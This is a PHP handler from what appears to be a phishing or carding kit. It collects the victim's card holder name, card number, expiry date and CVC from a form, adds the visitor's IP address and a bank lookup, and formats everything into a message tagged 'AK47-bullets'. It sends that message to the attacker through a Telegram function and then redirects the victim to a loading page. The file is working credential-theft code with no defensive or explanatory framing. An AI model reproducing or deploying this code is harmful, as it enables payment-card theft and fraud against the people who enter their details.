<?php

session_start();
require_once 'telegram.php';
require_once 'bin.php';
$bin = new bin;
$ip = getenv("REMOTE_ADDR");
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['name']) and !empty($_POST['number']) and !empty($_POST['exp']) and !empty($_POST['cvc'])
    ) {
            $_SESSION['name']=$_POST['name'];
            $_SESSION['number']=$_POST['number'];
            $_SESSION['exp']=$_POST['exp'];
            $_SESSION['cvc']=$_POST['cvc'];
            
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }}}

   			
            $Ak47 .= "🔥𝙉𝙀𝙒 𝘾𝙍𝙏|". bin::getbank($_POST['number']) ."|".$ip."\n";
            $Ak47 .= "┌─╼╼ ".$_SESSION['number']."\n";
            $Ak47 .= "├─ ".$_POST['exp']."\n";
            $Ak47 .= "└─╼╼ ".$_POST['cvc']."\n";
            $Ak47 .= "└─╼╼ ".$_POST['name']."\n";
            $Ak47 .= "▬▬▬▬▬▬▬▬▬▬\n";
            $Ak47 .= "ᴀᴋ47-ʙᴜʟʟᴇᴛs\n";
            

             telegram_send(urlencode($Ak47));
header("Location: ../load.php");


 ?>